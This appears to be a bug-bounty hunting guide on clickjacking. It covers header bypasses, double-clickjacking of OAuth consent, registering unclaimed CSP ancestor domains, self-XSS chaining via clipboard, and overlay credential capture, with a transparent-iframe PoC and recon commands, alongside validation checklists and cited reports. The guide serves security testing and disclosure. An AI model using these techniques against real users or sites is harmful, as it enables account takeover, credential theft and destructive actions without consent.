| Policy applied inconsistently | Compare main app vs. login/admin/subdomain headers | #231434, #231694, #140392, #65825, #264125 |
| Deprecated ALLOW-FROM | Read XFO value; open PoC in Chrome | #591432, #198622, #658217 |
| CSP2 support gap | Read `frame-ancestors`; test legacy Safari/IE | #85624 |
| Unclaimed ancestor domain | `dig` every domain in `frame-ancestors` | #371980 |
| Double-click sequence | Test OAuth consent with two-click flow | #3287060 |
| Framebuster as sole defense | Read JS for `top!==self`; test with sandbox | #85624, #270454 |
| Chained interaction XSS | Reflect a param inside the frame; force the click | #1171403, #1149144, #953579, #892289 |
| One-click destructive routes | Enumerate remove/delete/follow endpoints | #1416612, #201848, #675614, #7924 |
| Host cannot set headers | Identify S3/static hosting | #149572 |

The deeper organizational root cause is that framing protection is rarely broken centrally — it is **forgotten on the one route that matters**. That is why the highest-yield recon is not "does the site have XFO?" but "does the *specific state-changing, authenticated* endpoint have an effective policy in the browser the victim will use?"

---

## Bypass Techniques

### Weak / Deprecated Header Bypasses
- **ALLOW-FROM is ignored by Chrome/Safari** — `X-Frame-Options: ALLOW-FROM https://twitter.com/` behaves like no header in Chrome (#591432, #198622, #658217). Test in Chrome specifically.
- **CSP `frame-ancestors 'self'` unsupported in Safari/IE** — frame in a browser that ignores CSP2 (#85624).
- **SAMEORIGIN middle-man / top-window confusion** — because SAMEORIGIN compares the frame to the *top* window, a chain such as `twitter.com → attacker.com → twitter.com` has been used to evade it (#85624). Verify against the actual browser's ancestor-check behavior.

### CSP Ancestor-Allowlist Takeover
- Parse `frame-ancestors`; if any listed domain is unclaimed/NXDOMAIN, register it and frame from that origin (#371980: `*.mod-tools.com` was NXDOMAIN).
- Look for wildcard/subdomain allowlists that include domains an attacker can acquire.

### Framing Primitive Bypasses
- **data: URL in iframe** — used to bypass Flickr's clickjacking protection (#7264).
- **sandbox attribute tuning** — `allow-scripts allow-forms allow-same-origin` lets the framed page's own JS run while still being redressed (#688546, #270454).
- **Trusted framing intermediary** — Mail.ru reports bypassed XFO by routing through an approved framing domain (`profile.my.games`, `widget.support.my.games`, `webagent.mail.ru` → `web.icq.com`) (#974090, #1027192, #918923).

### Double-Clickjacking (defeats XFO/CSP)
- Open the consent page as a top-level window and use the mousedown/click timing gap to reposition the victim's second click onto "Authorize" (#3287060). No iframe is involved at the moment of the click, so header-based defenses do not apply.

### Interaction-Chain Bypasses
- **Self-XSS + clipboard** — write the payload to the clipboard via `navigator.clipboard.writeText()` in the framed page and coax a paste into an upload/textarea field (#892289).
- **Reflected XSS through frame** — a framed URL parameter that reflects a payload can be triggered by the forced click (#1171403, #1149144, #1221942).
- **Session recording / geolocation** — embed Inspectlet-style tracking in the decoy page to capture the victim's session, IP, and geo while they interact with the frame (#998555).

### Context / Delivery Bypasses
- **Mobile UA** — serve the mobile view that lacks headers (#103178, #106362).
- **Open redirect after action** — point the post-click redirect at the attacker's payment gateway (#921709, #225555, #230581).
- **RTLO character** — related UI-redressing trick to mask real file extensions in share links (#229170).

### SAMEORIGIN Middle-Man (worked example from #85624)
The Twitter player-card report explains the logic directly: "SAMEORIGIN only checks if the embedded frame is on the same origin of the top window. For example, attacker can do something like twitter.com -> attacker.com -> twitter.com to evade it." Because the check is against the top-level origin rather than the full ancestor chain, an attacker who can introduce an intermediate origin may satisfy the check while still controlling the redressing layer. This is browser-dependent — always demonstrate the actual frame tree in the PoC rather than arguing the theory.

### CSP Allowlist Domain Reconnaissance (worked example from #371980)
```bash
# 1. Read the policy on the sensitive page
curl -sI https://target.example/ | grep -i content-security-policy
# content-security-policy: frame-ancestors 'self' https://*.mod-tools.com:*

# 2. Check every allowlisted domain for ownership
dig mod-tools.com          # → status: NXDOMAIN (unclaimed)
whois mod-tools.com

# 3. If unclaimed, register it and host the PoC on an allowed ancestor origin.
#    The browser now considers the framing origin explicitly permitted.
```
Lesson: a `frame-ancestors` allowlist is only as strong as the ownership of every domain in it. Wildcards like `https://*.partner.example:*` are only safe if the entire zone is controlled by the victim.

### Trusted-Intermediary Framing (Mail.ru family, #974090 / #1027192 / #918923)
Several reports bypassed XFO on a sensitive endpoint by reaching it *through* a domain the target already trusts to frame it:
- `profile.my.games/gamecenter/profile/` — sensitive cross-site actions despite "Bypass X-Frame-Options" (#974090).
- `donationalerts.com/help/support` used to bypass `widget.support.my.games` XFO (#1027192).
- `webagent.mail.ru` used to bypass protection on `web.icq.com` (#918923).
Method: find any existing legitimate framer of the target (partner widget, support chat, embedded player), then see whether you can place your content in that framer's position or reuse the endorsed frame context.

### When a Real Header Blocks You
- Confirm the value: `DENY` / `SAMEORIGIN` / `frame-ancestors 'none'|'self'` with full browser support is a genuine stop for classic framing. Do not fabricate a bypass — pivot to a different page, subdomain, mobile view, or double-clickjacking, or accept it is protected.
- Distinguish "blocked in my browser" from "blocked everywhere." #85624 and #198622 turned a policy that looked protective in one browser into a finding in another.
- If a header is present but the page still renders (because the directive is malformed, duplicated, or overridden by a meta tag that browsers ignore), treat the observed behavior — not the header string — as authoritative.
- Never claim a bypass without a screenshot of the page actually rendering in the attacker-origin frame. Reviewers reject theoretical header-analysis reports.

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Show the target page rendered inside an attacker-controlled iframe in a real browser (screenshot).
   - Show a *sensitive state-changing action* triggered by the framed click — account modified, app deleted, token granted, payment redirected — not merely "the page frames."
   - If relying on a weak header (ALLOW-FROM, CSP unsupported), show it actually frames in the specific browser tested.

2. **What does the victim LOSE?**
   - Account takeover (forced login, OAuth code/token theft, credential capture)?
   - Financial loss (donation/payment redirected, purchases made)?
   - Privacy / data exposure (email/username/PII/geo leaked, private settings changed)?
   - Integrity/availability (data deleted, account deactivated, role changed)?
   - "Missing X-Frame-Options on a read-only page" with no demonstrable loss is at best informational — quantify the blast radius or deprioritize.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the exact URL still frameable and the sensitive action still one click away?
   - Does the PoC work reliably in a clean browser with a fresh victim session?
   - Can a triager follow the HTML + header output + steps and see the same state change?
   - Note browser/OS versions (several findings are browser-specific: #3287060 Firefox 140, #85624 Safari/IE, #198622 Chrome).

**Reject these false positives:** public read-only pages with no sensitive action; APIs/JSON/image endpoints (not HTML frames); header absence with no working-frame PoC; a frame that is blanked by JS/CSP; a framed action that fails because the cookie is `SameSite=Lax/Strict` or the victim is unauthenticated.

### Quick Validation Matrix

| Question | Pass condition | Fail condition (do not report) |
|----------|----------------|--------------------------------|
| Does it frame? | Page renders in attacker-origin iframe in a real browser | Blank/redirected by framebuster or CSP |
| Is there a weak/absent header? | No directive, ALLOW-FROM, CSP2 gap, or claimable ancestor | DENY / SAMEORIGIN / frame-ancestors 'none'\|'self' fully enforced |
| Is the action sensitive? | State change: grant, delete, transfer, settings, credentials | Read-only marketing/docs page |
| Does the session survive? | Authenticated action succeeds in the cross-site frame | Cookie withheld (SameSite Lax/Strict) or victim logged out |
| Is impact observable? | Screenshot/video of overlay **and** resulting state change | "The page loaded in an iframe" only |
| Is it reproducible? | Clean-session triager reproduces in 10 minutes | Browser/token/timing dependent without instructions |

### Report-Writing Note
State the browser and version, whether the victim must be authenticated, the exact header values observed, the `SameSite` attribute of the session cookie, and the concrete outcome of the framed click. Reports that supplied a PoC video (#355859, #737625, #892289) or a Burp-generated overlay with a visible "complete" element (#201848, #244697) gave triage the clearest evidence of impact.

---

## Real Impact Examples

### Scenario A: OAuth Consent Theft via Double-Clickjacking (WakaTime / Coinbase Pattern)
An attacker registers an OAuth app and lures the victim to a page that opens the provider's "Connect my account" consent dialog as a top-level window (so XFO never applies). Using the mousedown/click timing gap, the attacker positions the victim's second click onto "Authorize." The authorization code is delivered to the attacker's redirect URI and exchanged for an access token, granting full API access to the victim's account. Traditional X-Frame-Options does not prevent this two-click sequence. Grounded in #3287060 (WakaTime) and the framed OAuth authorize button in #65825 (Coinbase, $5,000) and #737625 (Stripo → MailChimp credentials).

**Attack flow:**
1. Attacker creates an OAuth application under their control and notes its `client_id` and `redirect_uri`.
2. Attacker hosts a page whose button calls `window.open(<provider>/oauth/authorize?...)` — a top-level window, so the consent page's XFO/CSP frame policy never engages.
3. On the first mousedown, the attacker page repositions the opened window (or swaps its content via `opener`) so the consent dialog's "Authorize" button sits under the victim's cursor.
4. The victim's second click lands on "Authorize"; the code is sent to the attacker's redirect URI.
5. Attacker exchanges the code for an access token and performs API actions as the victim.
6. **Why it is critical:** a single innocuous-looking double click yields persistent delegated access; the victim sees only a consent screen they believe they dismissed.

### Scenario B: One-Click Destructive Action or Account Change (Yelp / Mail.ru / TikTok Pattern)
A sensitive endpoint such as `/user_photos/{photo_id}/remove` (#201848), `pw.mail.ru` avatar delete (#675614), or a developer-app delete (#1416612) lacks XFO. The attacker overlays a transparent iframe so a decoy "Claim prize" click lands on the hidden "Remove/Delete" control. While the victim is authenticated and the session cookie survives cross-site, the action executes irreversibly. Related framed account changes include email modification (#783191) and privacy-settings changes (#103178), and framed profile-data edits (#765355, #261652).

**Attack flow:**
1. Attacker identifies a one-click state-changing route and confirms it frames while the victim is logged in.
2. A transparent iframe is positioned over a decoy button; the hidden "Delete" control is aligned to the decoy's coordinates.
3. Victim clicks the decoy; the framed page receives the click with the victim's session and performs the deletion.
4. The account is modified or data destroyed with no visible indication — the victim believes they clicked a prize button.
5. **Why it is high-severity:** the outcome (deleted application, removed photo, changed email) is often irreversible and directly harms the victim's account integrity.

### Scenario C: Self-XSS + Clickjacking → Account Takeover (Imgur / Tumblr / DoD Pattern)
A DOM/reflected XSS that "requires user interaction" or is "self-XSS" is normally non-reportable, but framing supplies the forced interaction. In Imgur #892289, the attacker frames the image-embed/upload flow, uses `navigator.clipboard.writeText()` to plant a self-XSS payload, and tricks the victim into pasting it → script execution → account takeover. Tumblr #953579 and the DoD reports #1171403/#1149144 chain clickjacking with DOM/reflected XSS to run code in the victim's browser under the target origin.

**Attack flow:**
1. Find a reflected/DOM XSS or a self-XSS sink that a victim would normally have to trigger against themselves.
2. Frame the vulnerable page (or embed flow) so it renders in the attacker's decoy.
3. Supply the interaction: force the click that triggers the reflected payload, or write the payload to the clipboard and coax a paste into the framed upload field (#892289).
4. Script executes in the target origin — cookies, tokens, and DOM are accessible.
5. **Why it is critical:** clickjacking converts an "unexploitable" self-XSS into a real cross-user compromise, which is exactly what several triage teams look for before accepting the chain.

### Scenario D: Information / Credential Exfiltration via Framed Cards (Twitter / Acronis Pattern)
A framed lead-gen card (`cards.twitter.com`) sends the victim's email and username to the attacker on a button click (#154963). A framed SSO login (#299009, #971234) or a framed export-to-MailChimp page (#737625) captures typed credentials via an overlay keylogger. Acronis #998555 combines framing with Inspectlet session recording and geolocation APIs to capture the victim's IP/geo and full session.

**Attack flow:**
1. Identify a frameable page that either (a) transmits data on a button click, or (b) contains credential-input fields.
2. Overlay the frame so the victim interacts with it under a benign pretext ("Enter your email to continue", "Connect your MailChimp").
3. Data leaves via the page's own behavior (#154963) or via a keylogger script in the decoy page (#737625).
4. Optionally layer session-recording/geo tooling to capture IP, location, and the full interaction (#998555).
5. **Why it matters:** even without a state-changing action, silent PII/credential capture is reportable and has produced Medium ratings (#355859, #737625).

---

## Disclosed Report Citations (30 verified, real IDs from the study pack / TOP list)

1. **PortSwigger Web Security — RCE of Burp Scanner / Crawler via Clickjacking** ([H1 #1274695](https://hackerone.com/reports/1274695)) — headless-browser clickjacking → Chrome XSS → RCE; public-code-search/server-side-rendering/websocket, 2021 / $3,000. Embedded Chrome's remote-debugging websocket exposed by a clickjack-triggered XSS.
2. **X / xAI — Twitter Periscope Clickjacking Vulnerability** ([H1 #591432](https://hackerone.com/reports/591432)) — ALLOW-FROM-ignored framing; subdomain/public-code-search, 2019 / $1,120. `X-Frame-Options: ALLOW-FROM https://twitter.com/` ignored by several browsers; account deactivation via framed click. Fix: `frame-ancestors 'self'`.
3. **X / xAI — Highly wormable clickjacking in player card** ([H1 #85624](https://hackerone.com/reports/85624)) — SAMEORIGIN + CSP2 + JS-framebuster weaknesses; filter-bypass, 2015 / $0. Middle-man top-window chain and CSP2 browser-support gaps.
4. **WordPress — Clickjacking on donation page** ([H1 #921709](https://hackerone.com/reports/921709)) — payment-redirect framing; redirect-handling/xml-parser, 2020 / $0. Framed "Give once" button redirected victims to attacker's PayPal.
5. **X / xAI — Viral Direct Message Clickjacking via link truncation** ([H1 #643274](https://hackerone.com/reports/643274)) — credential capture + malicious-app install; server-side-rendering/image-processing/redirect-handling, $0. Viral DM link truncation captured Google credentials and installed a third-party Twitter app.
6. **WakaTime — Double Clickjacking Attack on WakaTime OAuth Authorization Flow** ([H1 #3287060](https://hackerone.com/reports/3287060)) — double-clickjacking OAuth consent; url-fetching, 2021 / $0. Defeats XFO entirely; captures and exchanges authorization code. Tested Firefox 140.
7. **Shipt — Sensitive Clickjacking on admin login page** ([H1 #389145](https://hackerone.com/reports/389145)) — framed admin login; admin-internal, $0. Privileged-login redressing.
8. **X / xAI — Stealing User emails by clickjacking cards.twitter.com/xxx/xxx** ([H1 #154963](https://hackerone.com/reports/154963)) — lead-gen card data theft; clickjacking, 2016 / $0. A framed card button sends victim email + username to attacker's domain.
9. **VK.com — Clickjacking vkpay** ([H1 #374817](https://hackerone.com/reports/374817)) — framed payment widget; clickjacking, $0.
10. **Automattic — [api.tumblr.com] Exploiting clickjacking to trigger self DOM-based XSS** ([H1 #953579](https://hackerone.com/reports/953579)) — clickjacking → DOM-XSS chain; js-source-review/server-side-rendering, 2020 / $0. Clickjack triggers a self-DOM-XSS in `console.js` (follow/unfollow).
11. **TikTok — Clickjacking Vulnerability Can Leads To Delete Developer APP** ([H1 #1416612](https://hackerone.com/reports/1416612)) — destructive framed action; clickjacking, $500. One framed click deletes a developer application.
12. **BOHEMIA INTERACTIVE a.s. — Clickjacking at ylands.com** ([H1 #405342](https://hackerone.com/reports/405342)) — site-wide missing XFO; server-side-rendering/xml-parser, 2018 / $80. Multiple frameable URLs.
13. **Rocket.Chat — Clickjacking in the admin page** ([H1 #728004](https://hackerone.com/reports/728004)) — framed admin/users page; admin-internal/subdomain-takeover, 2019 / $0. Affects all Rocket.Chat installations' admin info page.
14. **Acronis — Clickjacking on cas.acronis.com login page** ([H1 #971234](https://hackerone.com/reports/971234)) — framed SSO login; js-source-review/image-processing, 2020 / $0. Fix: `frame-ancestors 'self'`.
15. **Yelp — CRITICAL-CLICKJACKING at Yelp Reservations** ([H1 #355859](https://hackerone.com/reports/355859)) — framed reservation + PII/credit-card misuse; image-processing/time-based, 2018 / $0 (CVSS 6.3). Victim's email/mobile shared with a business unknowingly.
16. **Shopify — Clickjacking in [exchangemarketplace.com]** ([H1 #658217](https://hackerone.com/reports/658217)) — ALLOW-FROM ignored; search-filter-sort, 2019 / $0. Nearly all logged-in actions frameable (inbox, logout, sell).
17. **Imgur — self-xss with ClickJacking can leads to account takeover in Firefox** ([H1 #892289](https://hackerone.com/reports/892289)) — self-XSS + clipboard + framed embed; subdomain/js-source-review/dom-based, 2020 / $0. `navigator.clipboard.writeText()` plants the self-XSS payload.
18. **Coinbase — OAuth authorization page vulnerable to clickjacking** ([H1 #65825](https://hackerone.com/reports/65825)) — framed OAuth authorize button; misconfiguration, $5,000. Missing XFO on OAuth response; fixed by adding site-standard headers.
19. **U.S. Dept Of Defense — Reflected XSS through ClickJacking** ([H1 #1171403](https://hackerone.com/reports/1171403)) — framed reflected XSS; url-fetching/image-processing, 2021 / $0. Image-background decoy + `style="opacity:0"` iframe carrying a `javascript:` URL.
20. **Mail.ru — Modifying application settings via clickjacking on o2.mail.ru** ([H1 #355774](https://hackerone.com/reports/355774)) — framed edit/delete app; clickjacking, 2016 / $150.
21. **lemlist — Clickjacking at app.lemlist.com** ([H1 #1574017](https://hackerone.com/reports/1574017)) — missing XFO; server-side-rendering, 2022 / $0 (CVSS 7.3).
22. **Automattic — Modify account details via clickjacking on refer.wordpress.com** ([H1 #765355](https://hackerone.com/reports/765355)) — authenticated settings change; clickjacking, 2019 / $0. Framed `/affiliate-network/campaign-settings/`.
23. **X / xAI — Clickjacking Periscope.tv on Chrome** ([H1 #198622](https://hackerone.com/reports/198622)) — ALLOW-FROM ignored by Chrome; server-side-rendering, 2017 / $560. Forced follow via framed clicks.
24. **Semrush — Single Sing On - Clickjacking** ([H1 #299009](https://hackerone.com/reports/299009)) — framed SSO login; sso-oauth, 2017 / $0. Credential disclosure / account control.
25. **Kaspersky — Certificate warnings and similar UI elements in AV products susceptible to clickjacking** ([H1 #463695](https://hackerone.com/reports/463695)) — AV security-prompt redressing; server-side-rendering/redirect-handling/admin-internal, 2018 / $0. Trick users into overriding certificate warnings / disabling Safe Money.
26. **Acronis — Get ip and Geo location any user via Clickjacking with inspectlet technology** ([H1 #998555](https://hackerone.com/reports/998555)) — session-recording + geo/IP leak; js-source-review/session-attack, 2020 / $0. Inspectlet tracking on the decoy page captured victim sessions and geolocation data.
27. **Mail.ru — Delete images of users with clickjacking in https://pw.mail.ru** ([H1 #675614](https://hackerone.com/reports/675614)) — destructive framed action; image-processing, $0. Trick user to delete avatar / change profile data.
28. **Imgur — Attack User Privacy Settings (X-Frame-Options missing on m.imgur.com/user/username/settings)** ([H1 #103178](https://hackerone.com/reports/103178)) — mobile-view privacy change; comment-injection, $0. Two-click privacy-settings change; mobile UA required (tested with UCBrowser UA switcher).
29. **Cuvva — https://admin.corp.cuvva.co/ is vulnerable to Clickjacking attacks due to missing X-Frame-Options** ([H1 #231434](https://hackerone.com/reports/231434)) — framed admin dashboard; admin-internal, $0. Authenticated-user UI redressing in the dashboard.
30. **Yahoo! — Bypass of the Clickjacking protection on Flickr using data URL in iframes** ([H1 #7264](https://hackerone.com/reports/7264)) — data-URL framing bypass; filter-bypass, $0. Uses `data:` URLs inside iframes to evade Flickr's protection.

### Evidence Trail by Technique (cross-reference of the 30 citations above)

- **Deprecated ALLOW-FROM / browser-support gap:** #591432, #198622, #658217, #85624 — the same root cause reported across multiple programs and years.
- **OAuth / SSO consent redressing:** #65825, #3287060, #737625, #299009, #971234, #64946 — the highest-bounty cluster in the set.
- **Chained XSS / self-XSS:** #953579, #892289, #1171403, #1149144, #1221942 — clickjacking supplies the missing user interaction.
- **Destructive / state-changing actions:** #1416612, #201848, #675614, #1301113, #7924, #355774, #765355 — one click changes or deletes data.
- **Credential / PII exfiltration:** #154963, #998555, #737625, #639682, #355859 — data leaves via page behavior or overlay keylogging.
- **Admin / internal surfaces:** #728004, #231434, #231694, #389145 — privileged victims, often authenticated-only.
- **Framing-primitive bypasses:** #7264 (data: URL), #371980 (claimable CSP ancestor), #85624/#198622 (policy ignored by browser), #3287060 (double-clickjacking).
- **Payment / money movement:** #921709, #374817, #355859, #471967 — financial harm or redirect to attacker gateway.
- **Site-wide / missed-route findings:** #405342, #1039805, #832593, #1185949, #264125 — breadth of framing, retest after fixes.
- **Highest payouts in the set:** #65825 ($5,000), #1274695 ($3,000), #591432 ($1,120), #198622 ($560), #1416612 ($500), #355774 ($150), #405342 ($80). Payouts track *demonstrated impact*, not header absence.

All IDs and URLs above are taken verbatim from the 147-report study pack and the TOPCLICKJACKING TOP list; no identifier has been invented.

---

## Related Skills & Chains

- **`hunt-xss`** — Clickjacking is the delivery vehicle for "user-interaction-required" and self-XSS. Chain primitive: framed page + forced click/paste → reflected/DOM XSS becomes exploitable (#953579, #892289, #1171403, #1221942).
- **`hunt-csrf`** — Clickjacking is a visual CSRF primitive: the framed click performs a state change with the victim's session. Chain primitive: transparent iframe over a one-click endpoint → unauthorized action (#214087, #14494).
- **`hunt-oauth` / `hunt-sso`** — Consent screens are crown jewels. Chain primitive: framed/double-clicked "Authorize" → authorization code/token theft → account takeover (#65825, #3287060, #737625, #64946).
- **`hunt-subdomain-takeover`** — Unclaimed CSP ancestor domains are frame-allowlisted. Chain primitive: register NXDOMAIN `frame-ancestors` domain → legitimate framing of the sensitive page (#371980). Also forgotten subdomains often lack XFO (#140392, #231694).
- **`hunt-info-disclosure`** — Framed lead-gen/embed cards and session-recording overlays leak PII, email, geo, and IP (#154963, #998555, #639682).
- **`hunt-rce`** — In rare cases clickjacking into an embedded browser (Burp Scanner's headless Chrome) chains through an XSS to RCE (#1274695).
- **`security-arsenal`** — Load the Clickjacking/UI-Redressing PoC templates (opacity overlay, Burp `clickjack_focus`/`clickjack_button` generator, `clip-path` preserve-3d) and the browser-support matrix for XFO `ALLOW-FROM` and CSP `frame-ancestors` before building the PoC.
- **`triage-validation`** — Apply the Gate 0 check: never report missing headers alone; require a browser-rendered frame, a sensitive state change, and reproducible evidence (screenshots + header output + browser/UA versions).

### High-Value Chain Recipes

```
clickjacking → self-XSS / DOM-XSS → account takeover
  #892289 (Imgur), #953579 (Tumblr), #1171403 / #1149144 (DoD)

clickjacking → OAuth authorize click → authorization code → access token
  #65825 (Coinbase), #3287060 (WakaTime), #737625 (Stripo→MailChimp)

frameable one-click endpoint → CSRF-equivalent state change
  #1416612 (delete app), #201848 (remove photo), #1301113 (deactivate)

unclaimed CSP ancestor domain → register it → legitimate framing of sensitive page
  #371980 (OLX / mod-tools.com)

forgotten subdomain → no XFO → authenticated admin UI redressing
  #231434 / #231694 (Cuvva), #728004 (Rocket.Chat)

framed reflected XSS + post-action open redirect → victim to attacker payment gateway
  #921709 (WordPress donation), #230581, #225555

embedded headless browser → clickjack-triggered XSS → debug port → RCE
  #1274695 (Burp Scanner)
```

### When to Pair With Other Skills
- Pair with **`hunt-xss`** whenever a reflection or DOM sink "needs a click" — the two bugs multiply each other's impact.
- Pair with **`hunt-oauth`** on every consent screen; double-clickjacking is now a standard OAuth test case, not a curiosity.
- Pair with **`hunt-subdomain-takeover`** when a CSP allowlist names domains you can acquire — ownership checks belong in both workflows.
- Pair with **`hunt-info-disclosure`** for framed widgets/cards that transmit email, username, or geo on interaction.
- Pair with **`security-arsenal`** to standardize the PoC generator output and the browser-support matrix, so that every candidate is tested in Chrome, Firefox, and a legacy browser before being dismissed.


---

## Merged Source Knowledge

This section consolidates **5 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (5 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-clickjacking/SKILL.md`

## What is Clickjacking

Clickjacking (UI Redressing) lets an attacker load a target page inside a transparent iframe on a malicious site. The victim sees the attacker's decoy UI but clicks the hidden target UI beneath it. No JavaScript on the target is required.

**Highest-value targets:**
- Login / authentication pages — force login with attacker credentials
- Money transfer / checkout / "confirm payment" buttons
- Account settings (email change, password change, 2FA disable)
- OAuth / social-login "Authorize app" confirmation dialogs
- Admin actions (delete, promote user, change role)

## Protection Headers

Two mechanisms prevent framing:

```
X-Frame-Options: DENY              # strongest — blocks all framing
X-Frame-Options: SAMEORIGIN        # allows same-origin frames only
Content-Security-Policy: frame-ancestors 'none'     # CSP equivalent of DENY
Content-Security-Policy: frame-ancestors 'self'     # CSP equivalent of SAMEORIGIN
```

If NEITHER is present, the page is frameable from any origin.

## How to Test

Header-absence is the **trigger for investigation, not the finding**. Two steps:

**Step 1 — Header check (screening).** Fetch the target page and inspect the response headers:

```
curl -sI https://target.example/account/transfer | grep -iE 'x-frame-options|content-security-policy'
```
If BOTH `X-Frame-Options` and CSP `frame-ancestors` are absent, the page is a *candidate*. If either is present and restrictive (`DENY`/`SAMEORIGIN`/`frame-ancestors 'none'|'self'`), stop — it's protected.

**Step 2 — Prove it actually frames and clicks (required for a real finding).** Build a minimal PoC and load it in a real browser:

```html
<!doctype html>
<h1>Win a prize — click below</h1>
<iframe src="https://target.example/account/transfer"
        style="opacity:0.1;position:absolute;top:0;left:0;width:1000px;height:800px"></iframe>
```
Confirm ALL of the following, or it is not exploitable:
- The page **actually renders inside the iframe** (no framebusting JS that blanks/redirects it — e.g. `if(top!==self)` breakout, or a `Sec-Fetch-Dest`/JS frame check).
- The **sensitive action still works while framed** — critically, the action must succeed *cross-site*. If it relies on a session cookie set `SameSite=Lax` or `SameSite=Strict` (the modern default), the cookie is **not** sent on the cross-site framed request, and the clickjack fails. Verify the victim's authenticated state carries into the frame.
- The target is a **state-changing action** (transfer, settings/email/password change, 2FA disable, OAuth authorize, admin action), not a read-only page.

**Strategy:** target the most sensitive action pages first — severity scales directly with what the victim is tricked into doing.

## False Positives

- Public, read-only pages (home/marketing) lacking frame protection are low/informational — no sensitive action to redress.
- APIs and non-HTML endpoints (JSON, images) are not clickjacking targets.
- **Header-absence alone is NOT a finding.** SameSite cookies, framebusting JS, or the lack of any sensitive framed action can each fully defeat it — which is why Step 2 is mandatory.

## Proof Requirements

A valid clickjacking report shows: (1) the target page rendered inside an attacker-controlled iframe in a real browser, (2) a sensitive state-changing action reachable by a framed click while the victim is authenticated (cookies survive the cross-site context), and (3) a screenshot/recording of the overlay. Reporting missing headers with no working frame PoC is a documentation-quality issue, not a vulnerability.
